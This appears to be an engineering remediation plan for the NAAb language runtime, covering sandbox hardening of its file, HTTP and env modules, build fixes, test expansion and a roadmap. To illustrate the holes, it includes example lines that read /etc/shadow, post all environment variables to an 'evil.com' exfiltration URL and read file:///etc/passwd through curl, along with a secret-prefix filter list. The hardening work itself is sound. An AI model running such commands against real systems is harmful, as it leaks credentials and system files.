# NAAb Enterprise Remediation Plan

Comprehensive plan to take NAAb from working concept to enterprise-ready.
Based on exhaustive deep-dive into every audit finding.

---

## Deep-Dive Findings Summary

### What's Better Than Expected
- **LSP exists and works** — 2,574 lines across 15 files (completion, hover, definition, documentSymbol providers). Audit item 2.4 was overstated.
- **Subprocess execution is NOT command-injectable** — `subprocess_helpers.cpp` uses `fork()/execvp()` with argv arrays. No shell interpretation. This is secure by design.
- **Shell executor has proper fail-closed security** — checks `allow_exec` AND `SYS_EXEC` capability, defaults to DENY.
- **Generic subprocess executor checks BLOCK_CALL capability** — both `execute()` and `executeWithReturn()` paths.
- **C++ executor checks sandbox** — `canExecuteCommand()` before `system()`, and `canExecute()` + path traversal validation before `dlopen()`.
- **GC cycle detector is functional** — 133-line mark-and-sweep that iterates the NaabVal heap handle table directly. Not a hack — a real collector.
- **Resource limits work** — SIGALRM/SIGXCPU handlers, ScopedTimeout, RLIMIT_AS detection with diagnostic messages.

### What's Worse Than Expected
- **File stdlib is completely unsecured** — 17 functions, ZERO sandbox checks. `file.read("/etc/shadow")` works from any NAAb script regardless of sandbox level. This is the #1 critical issue.
- **HTTP module is completely unsecured** — 6 HTTP methods (GET/POST/PUT/DELETE/HEAD/PATCH) via libcurl with zero sandbox checks. A script can exfiltrate data to any URL.
- **ENV module is completely unsecured** — can read ALL env vars (including secrets like API keys), set arbitrary env vars, load arbitrary .env files. Zero capability checks.
- **30+ silent `catch(...){}` blocks** — errors swallowed in governance_init, interpreter, polyglot, call_dispatch, parser, cpp_executor_adapter, csharp_executor, ffi_async_callback.
- **Version mismatch confirmed** — config.h says "0.5.0", CMakeLists.txt says 0.5.0, CHANGELOG says 0.7.0.
- **REST API is a stub** — `/api/v1/execute` returns "Code execution not yet implemented".

---

## Phase 1: Security Hardening (P0 — Must Fix First)

### 1.1 Wire Sandbox into File Stdlib

**Problem:** `src/stdlib/file_impl.cpp` has 17 functions doing raw filesystem I/O. Zero `sandbox->canRead()`, zero `sandbox->canWrite()`, zero path canonicalization. The sandbox infrastructure (`sandbox.cpp`, 431 lines) exists with full capability checking and path whitelisting but is never called from file stdlib.

**Deep-dive detail:** Every file function takes a raw string path and passes it directly to `std::filesystem` or `std::fstream`. No `realpath()`, no traversal check, no symlink resolution. The sandbox has `canRead(path)`, `canWrite(path)`, `canDelete(path)`, `isPathAllowed(path)`, and `normalizePath()` using `realpath()` — all unused by file stdlib.

**Fix:**

1. Add sandbox check helper at top of `file_impl.cpp`:
```cpp
#include "naab/sandbox.h"

static void checkFilePermission(const std::string& path, const std::string& op) {
    auto* sandbox = naab::security::ScopedSandbox::getCurrent();
    if (!sandbox) return;  // No sandbox active — allow (backward compat)

    // Canonicalize path to prevent traversal
    std::string canonical = sandbox->normalizePath(path);

    bool allowed = false;
    if (op == "read" || op == "exists" || op == "is_file" || op == "is_dir" ||
        op == "list_dir" || op == "size" || op == "read_lines") {
        allowed = sandbox->canRead(canonical);
    } else if (op == "write" || op == "append" || op == "write_lines" ||
               op == "create_dir" || op == "copy" || op == "move") {
        allowed = sandbox->canWrite(canonical);
    } else if (op == "delete") {
        allowed = sandbox->canDelete(canonical);
    }

    if (!allowed) {
        sandbox->logViolation("file." + op, canonical,
            "FS_" + std::string(op == "read" ? "READ" : op == "delete" ? "DELETE" : "WRITE") +
            " capability required");
        throw std::runtime_error(
            "Security: file." + op + "() denied by sandbox\n\n"
            "  Path: " + path + "\n"
            "  Canonical: " + canonical + "\n\n"
            "  The current sandbox level does not allow this file operation.\n"
            "  Use --sandbox-level to adjust permissions.\n"
        );
    }
}
```

2. Add `checkFilePermission(path, "read")` at the start of every function in `FileModule::call()`:
   - `read` → checkFilePermission(path, "read")
   - `write` → checkFilePermission(path, "write")
   - `append` → checkFilePermission(path, "write")
   - `exists` → checkFilePermission(path, "read")
   - `delete` → checkFilePermission(path, "delete")
   - `list_dir` → checkFilePermission(path, "read")
   - `create_dir` → checkFilePermission(path, "write")
   - `is_file`, `is_dir` → checkFilePermission(path, "read")
   - `read_lines` → checkFilePermission(path, "read")
   - `write_lines` → checkFilePermission(path, "write")
   - `copy` → check both src (read) and dst (write)
   - `move` → check both src (delete) and dst (write)
   - `size` → checkFilePermission(path, "read")
   - `basename`, `dirname`, `extension` → pure path ops, no check needed

**Files:** `src/stdlib/file_impl.cpp`
**Tests:** Add `tests/security/test_file_sandbox.naab` — verify read/write/delete are blocked under restricted sandbox.

### 1.2 Wire Sandbox into HTTP Stdlib

**Problem:** `src/stdlib/http_impl.cpp` (389 lines) makes libcurl calls to ANY URL with zero permission checks. A NAAb script can `http.post("https://evil.com/exfil", env.get_all())`.

**Deep-dive detail:** The `performRequest()` helper at line 55 takes a raw URL and sends it directly to curl. No domain allowlist, no sandbox `canConnect()` check, no URL scheme validation (can do `file:///etc/passwd` via curl).

**Fix:**

1. Add sandbox check in `performRequest()` before the curl call:
```cpp
#include "naab/sandbox.h"

// At top of performRequest():
auto* sandbox = naab::security::ScopedSandbox::getCurrent();
if (sandbox) {
    if (!sandbox->canConnect(url)) {
        sandbox->logViolation("http." + method, url, "NET_CONNECT capability required");
        throw std::runtime_error(
            "Security: HTTP request denied by sandbox\n\n"
            "  URL: " + url + "\n"
            "  Method: " + method + "\n\n"
            "  The current sandbox level does not allow network connections.\n"
        );
    }
}
```

2. Add URL scheme validation — reject `file://`, `gopher://`, `dict://`:
```cpp
if (url.substr(0, 7) == "file://" || url.substr(0, 9) == "gopher://" ||
    url.substr(0, 7) == "dict://") {
    throw std::runtime_error("Security: URL scheme not allowed: " + url);
}
```

**Files:** `src/stdlib/http_impl.cpp`
**Tests:** Add `tests/security/test_http_sandbox.naab`

### 1.3 Wire Sandbox into ENV Stdlib

**Problem:** `src/stdlib/env_impl.cpp` (373 lines) can read ANY environment variable (including `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, etc.), set arbitrary env vars, and load arbitrary `.env` files. Zero sandbox checks.

**Deep-dive detail:** `env.get("SECRET_KEY")` calls `std::getenv()` directly. `env.set_var()` calls `setenv()` directly. `env.get_all()` iterates `extern char **environ` and returns everything. `env.load_dotenv(path)` reads any file and sets env vars from it.

**Fix:**

1. Add sandbox checks for sensitive operations:
```cpp
#include "naab/sandbox.h"

// For env.get(), env.has(), env.get_int/float/bool:
// - Allow if no sandbox active (backward compat)
// - If sandbox active, check ENV_READ capability
// For env.set_var(), env.delete_var():
// - Check ENV_WRITE capability
// For env.get_all(), env.list():
// - Check ENV_READ capability, filter out sensitive vars
// For env.load_dotenv():
// - Check both FS_READ (file access) and ENV_WRITE (setting vars)
```

2. Add sensitive var filtering for `get_all()` under sandbox:
```cpp
static const std::vector<std::string> SENSITIVE_PREFIXES = {
    "AWS_", "AZURE_", "GCP_", "GOOGLE_", "DATABASE_", "DB_",
    "SECRET", "TOKEN", "PASSWORD", "API_KEY", "PRIVATE_KEY"
};
```

**Files:** `src/stdlib/env_impl.cpp`
**New capability needed:** Add `ENV_READ` and `ENV_WRITE` to `Capability` enum in `include/naab/sandbox.h`
**Tests:** Add `tests/security/test_env_sandbox.naab`

### 1.4 Fix Version Mismatch

**Problem:** `config.h` and `CMakeLists.txt` say 0.5.0. CHANGELOG says 0.7.0. Enterprise users need a single source of truth.

**Fix:**
1. Update `CMakeLists.txt` line 4: `VERSION 0.7.0`
2. Generate `config.h` from CMake:
```cmake
configure_file(
    "${CMAKE_SOURCE_DIR}/include/naab/config.h.in"
    "${CMAKE_BINARY_DIR}/include/naab/config.h"
)
```
3. Create `config.h.in`:
```cpp
#pragma once
#define NAAB_VERSION_STRING "@PROJECT_VERSION@"
#define NAAB_GIT_COMMIT_HASH "@GIT_HASH@"
// ...
```

**Files:** `CMakeLists.txt`, `include/naab/config.h` → `include/naab/config.h.in`

---

## Phase 2: Build & Distribution (P1)

### 2.1 CMake Install Targets

**Problem:** Only `naab-lsp` has an install target (line 803). `naab-lang` binary cannot be installed via `cmake --install`.

**Fix:** Add to `CMakeLists.txt`:
```cmake
include(GNUInstallDirs)
install(TARGETS naab-lang DESTINATION ${CMAKE_INSTALL_BINDIR})
install(TARGETS naab-lsp DESTINATION ${CMAKE_INSTALL_BINDIR})
install(DIRECTORY include/naab/ DESTINATION ${CMAKE_INSTALL_INCLUDEDIR}/naab
        FILES_MATCHING PATTERN "*.h")

# CMake package config for find_package(NaabLang)
include(CMakePackageConfigHelpers)
write_basic_package_version_file(
    "${CMAKE_CURRENT_BINARY_DIR}/NaabLangConfigVersion.cmake"
    VERSION ${PROJECT_VERSION}
    COMPATIBILITY SameMajorVersion
)
```

**Files:** `CMakeLists.txt`

### 2.2 Split governance.cpp (7,484 lines)

**Problem:** Single 7,484-line file is a maintenance nightmare. Auditors will flag this.

**Deep-dive:** The file has clear natural seams visible from section comments:
- Lines 1-286: Constants, enums, utility functions
- Lines 286-1555: `loadFromJson()` config parser
- Lines 1555-1720: `recordPass()`, `enforce()`
- Lines 1720-2450: Individual check functions (~30)
- Lines 2450-5500: Report generators (JSON, SARIF, JUnit, CSV, HTML, dashboard)
- Lines 5500-5850: Audit trail, telemetry
- Lines 5850-7484: C++ scanner, security checks

**Fix:** Split into 6 files:
| New File | Content | Est. Lines |
|----------|---------|-----------|
| `governance_engine.cpp` | Core: load, enforce, recordPass, init | ~1800 |
| `governance_checks.cpp` | All 30+ check functions | ~700 |
| `governance_security.cpp` | Taint, secrets, injection, C++ scanner | ~1700 |
| `governance_reports.cpp` | JSON/SARIF/JUnit/CSV/HTML/dashboard | ~2000 |
| `governance_audit.cpp` | Audit trail, telemetry, baseline | ~600 |
| `governance_quality.cpp` | Quality gate, CWE mapping | ~400 |

All share the same `GovernanceEngine` class — just split method implementations across files.

**Files:** `src/runtime/governance.cpp` → 6 files + update `CMakeLists.txt`

---

## Phase 3: Test Coverage (P1)

### 3.1 VM-Specific Tests (Currently: 7 → Target: 50+)

**Problem:** VM is the default engine but has only 7 dedicated tests in `tests/vm/`. The 331 mono-test passes give confidence but there are no targeted VM tests for edge cases.

**Fix:** Create `tests/vm/` tests for:
- Stack overflow detection (STACK_MAX=65536)
- Computed goto dispatch correctness
- NaN-boxing fast path arithmetic (int+int, int overflow → double promotion)
- Constant folding verification
- Bytecode serialization round-trip
- VM vs tree-walker result parity (automated diff)
- Closure capture in VM mode
- Exception handling in VM mode
- Nested function calls (deep call stack)
- Large array/dict operations in VM

### 3.2 Stdlib Module Tests (Currently: ~0 → Target: 100+)

**Problem:** No dedicated stdlib tests. Modules tested only indirectly through chapter verification tests.

**Fix:** Create `tests/stdlib/` with one test file per module:
| Module | Key Test Cases |
|--------|---------------|
| `test_array.naab` | push, pop, map, filter, reduce, sort, slice, concat, indexOf |
| `test_string.naab` | upper, lower, split, join, replace, trim, contains, starts_with |
| `test_math.naab` | abs, ceil, floor, round, sqrt, pow, min, max, random, PI |
| `test_file.naab` | read, write, append, exists, delete, copy, move, list_dir |
| `test_json.naab` | stringify, parse, nested objects, arrays, null handling |
| `test_time.naab` | now, sleep, format, diff |
| `test_http.naab` | get, post (mock server or httpbin) |
| `test_env.naab` | get, set_var, has, delete_var, get_all, load_dotenv |
| `test_io.naab` | write, read, error |
| `test_type.naab` | of, is_string, is_int, is_list, is_dict |
| `test_regex.naab` | match, search, replace, split |
| `test_crypto.naab` | hash, hmac |

### 3.3 CLI Flag Tests (Currently: 3 → Target: 20+)

**Fix:** Create `tests/cli/` tests for:
- `--tree-walk` vs default VM mode
- `--sandbox-level` (none, restricted, standard, strict)
- `--governance-override`
- `--governance-report`, `--governance-sarif`, `--governance-junit`
- `--governance-dashboard`
- `--env` (new feature)
- `--governance-baseline-save` (new feature)
- `--pipe` mode
- `--agent-id`
- Exit codes: 0, 1, 2, 3, 4

### 3.4 Security Test Suite (Currently: 9 → Target: 30+)

**Fix:** After sandbox wiring (Phase 1), add tests:
- File traversal attempts blocked
- HTTP exfiltration blocked
- Env secret access blocked
- Polyglot sandbox enforcement
- Symlink resolution
- Path canonicalization edge cases
- TOCTOU race condition tests

---

## Phase 4: Error Handling Cleanup (P1)

### 4.1 Audit and Fix Silent `catch(...){}` Blocks

**Problem:** 30+ `catch(...){}` blocks found across the codebase. Many silently swallow errors that could indicate corruption, security violations, or data loss.

**Deep-dive findings (categorized by severity):**

**Critical (errors swallowed that could indicate security/data issues):**
- `governance_init.cpp:54` — swallows governance init errors (security policy might not load)
- `interpreter.cpp:698` — swallows errors in expression evaluation
- `call_dispatch.cpp:318` — swallows function call errors
- `polyglot.cpp:1613` — swallows polyglot execution errors

**Medium (functional impact):**
- `main.cpp:1129, 1177, 2069, 2543` — various error swallowing in CLI
- `interpreter.cpp:2009, 2485` — error swallowing in interpreter paths
- `modules.cpp:805` — swallows module loading errors
- `parser.cpp:2239` — swallows parse errors
- `type_system.cpp:378` — swallows type checking errors

**Low (cleanup/adapter code):**
- `cpp_executor_adapter.cpp:22, 419, 425, 701, 707` — cleanup errors in destructors (acceptable)
- `csharp_executor.cpp:240, 246` — cleanup errors (acceptable)
- `generic_subprocess_executor.cpp:379` — cleanup (acceptable)
- `style_config.cpp:87` — style parsing error (acceptable fallback)

**Fix strategy:**
- **Critical:** Add `fprintf(stderr, "[WARN] ...")` at minimum, or re-throw with context
- **Medium:** Log the error and continue (don't re-throw if it breaks control flow)
- **Low (destructors):** Leave as-is — throwing from destructors is UB in C++
- **Across all:** Replace `catch(...){}` with `catch(const std::exception& e) { /* log */ }` to at least capture the error type

### 4.2 Fix TODO Items

**Critical TODOs:**
| File | Line | TODO | Fix |
|------|------|------|-----|
| `rest_api.cpp` | 49 | "Execute code using interpreter" | Either implement or remove the REST API feature |
| `main.cpp` | 620 | "Re-implement import blocking in PythonCExecutor" | Re-implement the Python import blocklist |
| `type_system.cpp` | 474 | "full type unification" | Document as known limitation or implement |
| `ffi_callback_validator.cpp` | 91-100 | "Implement proper type checking" (3x) | Implement FFI type validation |

**Non-critical TODOs (document or defer):**
| File | TODO | Action |
|------|------|--------|
| `debugger.cpp:253` | Use Environment interface | Low priority |
| `block_loader.cpp:93` | Parse JSON arrays | Feature enhancement |
| `call_dispatch.cpp:2178` | Get source_location from AST | DX improvement |
| `stack_tracer.cpp:43` | Check global color setting | Polish |
| `composition_validator.cpp:317` | Implement registry search | Feature |
| `type_checker.cpp:1171` | Parse list<T>, dict<K,V> | Type system |

---

## Phase 5: Stdlib Expansion (P2)

### 5.1 Add `log` Module

**Why:** Enterprise apps need structured logging with levels, timestamps, and output targets.

**API:**
```
use log

log.info("message")
log.warn("message")
log.error("message")
log.debug("message")
log.set_level("info")           // Filter level
log.set_format("json")          // "text" | "json"
log.set_output("stderr")        // "stderr" | "stdout" | "/path/to/file"
```

**Implementation:** New `src/stdlib/log_impl.cpp` (~200 lines). Uses fmt for formatting. JSON mode outputs `{"level":"info","msg":"...","ts":"ISO8601"}`.

### 5.2 Add `uuid` Module

**Why:** Unique identifiers for records, traces, correlation IDs.

**API:**
```
use uuid

let id = uuid.v4()              // Random UUID
let id = uuid.v5(namespace, name)  // Deterministic UUID
uuid.is_valid(str)              // Validate
```

**Implementation:** New `src/stdlib/uuid_impl.cpp` (~100 lines). Use `/dev/urandom` for v4, SHA-1 for v5.

### 5.3 Add `validate` Module

**Why:** Input validation without polyglot.

**API:**
```
use validate

validate.email("user@example.com")   // bool
validate.url("https://...")          // bool
validate.ip("192.168.1.1")          // bool
validate.int_range(x, 1, 100)       // bool
validate.matches(str, pattern)       // regex match
validate.not_empty(str)              // bool
validate.length(str, min, max)       // bool
```

**Implementation:** New `src/stdlib/validate_impl.cpp` (~250 lines). Regex-based validation.

### 5.4 Add `process` Module

**Why:** Subprocess management beyond polyglot blocks.

**API:**
```
use process

let result = process.run("ls", ["-la"])  // {exit_code, stdout, stderr}
process.spawn("long-running-cmd")        // Async (returns PID)
process.kill(pid)
process.exit(code)
```

**Implementation:** Reuse `subprocess_helpers.cpp` fork/execvp infrastructure.

---

## Phase 6: Architecture Improvements (P2)

### 6.1 REST API: Implement or Remove

**Problem:** REST API exists as a stub. It's listed as a feature but returns "Code execution not yet implemented". This damages credibility.

**Options:**
1. **Implement it** (~2 days): Wire `impl_->interpreter` to actually execute code in the `/api/v1/execute` handler. Add sandbox enforcement. Add rate limiting.
2. **Remove it** (~1 hour): Delete `src/api/rest_api.cpp`, `include/naab/rest_api.h`, and CMake references. Document removal in CHANGELOG.

**Recommendation:** Implement it — it's the foundation for "Governance as a Service" (Tier 4 differentiator).

### 6.2 GC Hardening

**Problem:** The cycle detector (133 lines) works but relies on periodic triggering. No automatic trigger based on allocation pressure.

**Deep-dive:** `CycleDetector::detectAndCollect()` does proper mark-and-sweep: marks from root env + extra_roots + env_stack_, then sweeps handle table clearing unreachable containers. The refcount adjustment (subtract 2 for iteration+callback overhead) is correct. However:
- There's no allocation counter to trigger GC automatically
- No configurable threshold
- No incremental/generational collection

**Fix:**
1. Add allocation counter in NaabVal heap allocation path
2. Trigger GC when allocation count exceeds threshold (e.g., 10,000)
3. Add `--gc-threshold N` CLI flag for tuning
4. Add `--gc-stats` to print GC statistics

### 6.3 REPL Improvements

**Problem:** REPL (229 lines) has basic file-based history (`~/.naab_history`) but no readline, no tab completion, no multiline editing.

**Fix:**
1. Integrate linenoise-ng (BSD licensed, ~1000 lines, no ncurses dependency)
2. Add tab completion for keywords, stdlib modules, and local variables
3. Add multiline editing with `\` continuation
4. Add `:help`, `:type expr`, `:env` REPL commands

---

## Phase 7: Enterprise Polish (P2-P3)

### 7.1 Documentation

**Currently:** 16 book chapters, EBNF grammar, CLAUDE.md. Good foundation.

**Missing:**
| Document | Priority | Content |
|----------|----------|---------|
| API Reference | P2 | Auto-generated from stdlib source (function signatures, types, examples) |
| Embedding Guide | P3 | How to use NAAb as a library in C++ applications |
| Migration Guide | P3 | Upgrading between versions, breaking changes |
| Security Guide | P2 | Sandbox levels, capability model, governance hardening |
| Performance Guide | P3 | VM vs tree-walker, optimization tips, governance overhead |

### 7.2 Stable Public API

**Problem:** 96 headers in `include/naab/` with no public/internal distinction.

**Fix:**
1. Create `include/naab/public/` with stable API headers:
   - `naab.h` — Main entry point (version, init, cleanup)
   - `naab_val.h` — Value type (already exists)
   - `naab_interpreter.h` — Interpreter facade
   - `naab_sandbox.h` — Sandbox configuration
2. Mark all other headers as internal (document in README)
3. Use `NAAB_API` export macro for public symbols

### 7.3 Windows Support

**Problem:** Uses POSIX-only: `fork()`, `execvp()`, `popen()`, `mkstemp()`, `flock()`, `localtime_r()`, `setenv()`, `SIGALRM`, `dup2()`.

**Fix (long-term):**
1. Abstract subprocess execution behind a platform layer
2. Use `CreateProcess()` on Windows instead of fork/exec
3. Use `_mktemp_s()` instead of `mkstemp()`
4. Use `GetEnvironmentVariable()` / `SetEnvironmentVariable()`
5. Add Windows CI (GitHub Actions `windows-latest`)

**Note:** This is P3 — significant effort (~5 days) with limited immediate ROI unless targeting Windows-first enterprises.

---

## Phase 8: Competitive Differentiators (P3)

### 8.1 Embeddable C API (libnaab)

Create a C API wrapper for embedding NAAb in other applications:
```c
naab_ctx* naab_init();
naab_val naab_eval(naab_ctx* ctx, const char* code);
naab_val naab_call(naab_ctx* ctx, const char* func, naab_val* args, int nargs);
void naab_free(naab_ctx* ctx);
```

Build as `libnaab.so` / `libnaab.a`. This is how Lua, mruby, and QuickJS achieved enterprise traction.

### 8.2 Governance as Standalone Tool

Extract governance engine as a standalone CLI tool (`naab-gov`) that can lint any polyglot project:
```bash
naab-gov scan --config govern.json --sarif report.sarif ./src/
```

Integrates with GitHub Code Scanning, GitLab SAST via SARIF output (already works).

### 8.3 LSP Enhancement

The LSP already has 2,574 lines with working providers. Enhance:
- Add diagnostics provider (real-time governance rule violations)
- Add code actions (fix suggestions)
- Add workspace symbol search
- Add rename support
- Test with VS Code extension

### 8.4 Deterministic Builds

For compliance-heavy industries (finance, healthcare):
- Pin polyglot runtime versions in `govern.json`
- Hash dependencies and verify at runtime
- Lockfile mechanism for package manager
- Reproducible bytecode compilation

---

## Implementation Order

| Sprint | Items | Est. Days | Tests Added |
|--------|-------|-----------|-------------|
| **Sprint 1** | 1.1 (file sandbox), 1.2 (HTTP sandbox), 1.3 (ENV sandbox), 1.4 (version fix) | 3 | +30 security |
| **Sprint 2** | 2.1 (install targets), 3.1 (VM tests), 3.3 (CLI tests), 4.1 (catch blocks) | 3 | +70 tests |
| **Sprint 3** | 2.2 (split governance.cpp), 3.2 (stdlib tests) | 3 | +100 tests |
| **Sprint 4** | 5.1 (log), 5.2 (uuid), 5.3 (validate) modules | 3 | +30 tests |
| **Sprint 5** | 4.2 (TODOs), 6.1 (REST API), 6.2 (GC), 6.3 (REPL) | 4 | +20 tests |
| **Sprint 6** | 7.1 (docs), 7.2 (public API), 3.4 (security tests) | 3 | +30 tests |
| **Sprint 7** | 5.4 (process), 8.1 (libnaab), 8.2 (standalone gov) | 5 | +20 tests |
| **Sprint 8** | 7.3 (Windows), 8.3 (LSP), 8.4 (deterministic) | 5 | +20 tests |

**Total: ~29 days, ~320 new tests**

Current: 398 tests → Target: ~718 tests

---

## Success Criteria

An enterprise security review should be able to:
1. Run `naab-lang --sandbox-level strict script.naab` and confirm file/HTTP/env access is denied
2. Run governance with quality gates and get exit code 2 on failure
3. Run `cmake --install` and get a properly installed binary + headers
4. See CWE IDs in SARIF output for automated vulnerability tracking
5. Get consistent version strings across all outputs
6. See structured logging from a NAAb script (log module)
7. Run the test suite and see >700 tests passing with 0 unexpected failures
8. Read API reference docs auto-generated from source

---

## Files Changed Per Sprint

### Sprint 1 (Security - 3 days)
| File | Change |
|------|--------|
| `src/stdlib/file_impl.cpp` | Add sandbox checks to all 17 functions |
| `src/stdlib/http_impl.cpp` | Add sandbox check in performRequest() |
| `src/stdlib/env_impl.cpp` | Add sandbox checks, sensitive var filtering |
| `include/naab/sandbox.h` | Add ENV_READ, ENV_WRITE capabilities |
| `src/runtime/sandbox.cpp` | Handle new capabilities |
| `include/naab/config.h` | Update to 0.7.0 or convert to .h.in |
| `CMakeLists.txt` | Update version to 0.7.0, add configure_file |
| `tests/security/test_file_sandbox.naab` | NEW |
| `tests/security/test_http_sandbox.naab` | NEW |
| `tests/security/test_env_sandbox.naab` | NEW |

### Sprint 2 (Build + Tests - 3 days)
| File | Change |
|------|--------|
| `CMakeLists.txt` | Add install targets, GNUInstallDirs |
| `tests/vm/test_vm_*.naab` | NEW (10+ files) |
| `tests/cli/test_cli_*.sh` | NEW (10+ files) |
| `src/cli/governance_init.cpp` | Fix catch block line 54 |
| `src/interpreter/interpreter.cpp` | Fix catch blocks lines 698, 2009, 2485 |
| `src/interpreter/call_dispatch.cpp` | Fix catch block line 318 |
| `src/interpreter/polyglot.cpp` | Fix catch block line 1613 |

### Sprint 3 (Governance Split + Stdlib Tests - 3 days)
| File | Change |
|------|--------|
| `src/runtime/governance.cpp` | Split into 6 files |
| `src/runtime/governance_engine.cpp` | NEW |
| `src/runtime/governance_checks.cpp` | NEW |
| `src/runtime/governance_security.cpp` | NEW |
| `src/runtime/governance_reports.cpp` | NEW |
| `src/runtime/governance_audit.cpp` | NEW |
| `src/runtime/governance_quality.cpp` | NEW |
| `tests/stdlib/test_*.naab` | NEW (12 files) |
